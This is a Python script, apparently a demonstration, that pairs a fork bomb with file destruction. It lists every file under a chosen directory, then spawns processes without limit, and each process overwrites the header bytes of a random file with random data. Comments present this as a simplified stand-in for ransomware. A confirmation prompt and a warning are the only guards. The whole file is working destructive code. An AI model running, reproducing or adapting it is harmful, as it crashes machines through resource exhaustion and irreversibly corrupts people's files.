import os
import random
import glob

def scan(directory):
    #Simple function originally much more complicated
    targets = glob.glob(''.join([directory,"/**/*"]), recursive=True)
    fileTargets = [f for f in targets if os.path.isfile(f)]
    return fileTargets

def scramble(file, target):
    global targets
    #In real ransomware this would be replaced by some type of encryption
    #instead of just randomly breaking the header
    try:
        with open(file, "rb+") as f:
            f.write(os.urandom(16))
    except Exception as e:
        #Don't target a file we can't touch(probably system32 or other important file)
        pass

def bomb():
    global targets
    target = random.randint(0, len(targets)-1)
    scramble(targets[target], target)

def split():
    child1 = -1
    child2 = -1
    try:
        child1 = os.fork()
    except:
        #There isn't any room for it
        pass
    if child1 == 0:
        bomb()
        split_mask()
    try:
        child2 = os.fork()
    except:
        #There is no room for it
        pass
    if child2 == 0:
        bomb()
        split_mask()

def split_mask():
    split()


def createBombers(directory):
    #This is the main function that starts all the problems
    try:
        pid = os.fork()
        if pid == 0:
            bomb()
            split()
        else:
            #What the parent proccess should do
            pass
    except:
        #Doesn't matter lets keep going
        pass

if __name__ == "__main__" and input("Confirm fork bomb? [y/n]:").lower() == 'y':
    #One last saftey before bombing
    targetDirectory = input("DO NOT PUT ~/ or C:/ THAT COULD CRUSH EVERY FILE\nTarget Directory:")
    targets = scan(targetDirectory)
    createBombers(targetDirectory)
